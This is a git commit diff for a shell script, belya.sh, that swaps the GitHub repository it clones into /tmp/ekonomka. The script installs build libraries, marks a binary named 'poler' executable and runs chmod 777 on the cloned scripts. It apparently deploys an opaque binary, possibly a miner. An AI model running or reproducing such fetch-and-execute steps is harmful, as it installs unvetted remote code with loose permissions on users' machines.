7c688fc6bd63d54bc24e41c9d94d74f707c7c291
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-06-22 06:29:00 +0000

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -8,7 +8,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir ekonomka
-git clone https://github.com/masketteland/ekonomka.git /tmp/ekonomka
+git clone https://github.com/robbertopp1/ekonomka.git /tmp/ekonomka
 cd /tmp/ekonomka
 chmod +x /tmp/ekonomka/poler
 chmod 777 ./*.sh
